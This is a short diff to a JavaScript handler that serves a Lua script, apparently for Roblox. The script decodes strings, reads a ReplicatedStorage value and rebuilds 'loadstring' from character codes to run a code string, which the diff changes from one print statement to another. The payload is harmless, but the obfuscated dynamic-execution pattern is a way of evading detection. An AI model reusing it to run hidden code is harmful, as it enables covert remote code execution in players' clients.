@@ -154,8 +154,8 @@ export default {
       const script = `
       local function ${decodedStr}(encodedStr, key) local result = {} local parts = string.split(encodedStr, "/") for i = 1, #parts do local byte = tonumber(parts[i]) local k = key:byte(((i - 1) % #key) + 1) local decoded = (byte - k + 256) % 256 table.insert(result, string.char(decoded)) end return table.concat(result) end 
       local a = game local b = "GetService" local c = "ReplicatedStorage" local d = "Destroy" local ${objStr} = a[b](a, c)["${data.Name}"].Value
-      local fn="";for _, c in ipairs({108, 111, 97, 100, 115, 116, 114, 105, 110, 103}) do fn=fn..string.char(c);end(getfenv()[fn] or _G[fn] or _ENV and _ENV[fn])('print("Hi")')()`;
-
+      local fn="";for _, c in ipairs({108, 111, 97, 100, 115, 116, 114, 105, 110, 103}) do fn=fn..string.char(c);end(getfenv()[fn] or _G[fn] or _ENV and _ENV[fn])("print('Hello')")()`;
+      
       return new Response(script, {
         headers: { "Content-Type": "text/plain" }
       });
